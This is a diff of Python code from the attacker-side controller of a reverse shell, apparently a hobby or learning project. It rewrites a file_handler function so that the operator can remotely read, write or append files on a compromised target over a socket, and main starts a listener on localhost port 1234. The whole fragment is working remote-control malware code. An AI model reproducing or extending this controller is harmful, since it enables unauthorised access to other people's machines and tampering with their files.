@@ -55,19 +55,25 @@ def command_handler(target_client):
     send_data(data, target_client)
 
 
-def file_handler(target_client):
-    # data_splits = 
-    print("enter FILE_UPDATE_QUIT to end data transfer")
-    while True:
-        data = str(input("--> "))
-        target_client.send(bytes(data, 'utf-8'))
-        acknowledgement =  target_client.recv(BUFFER_SIZE)
-        if(not(acknowledgement == b'ACK')):
-            # print("Data received at target end")
-            print("Acknowledgement receipt not received")
-        if(data == 'FILE_UPDATE_QUIT'):
-            break
-            print("\n$reverse_shell: ", end= "")
+def file_handler(target_client, command):
+    target_client.send(bytes(command, 'utf-8'))
+    acknowledgement = target_client.recv(BUFFER_SIZE)
+    if(acknowledgement == b'ACK'):
+        pass
+    data_splits = command.split(' ')
+    mode = data_splits[2]
+    if(mode == 'r'):
+        receive_data(target_client)
+            
+    elif(mode == 'w' or mode == 'a'):
+
+        print("enter FILE_UPDATE_QUIT to end data transfer")
+        while True:
+            data = str(input("--> "))
+            target_client.send(bytes(data, 'utf-8'))
+            if(data == 'FILE_UPDATE_QUIT'):
+                break
+        receive_data(target_client)
 
 def main():
     attacker_server_binder("localhost", 1234)
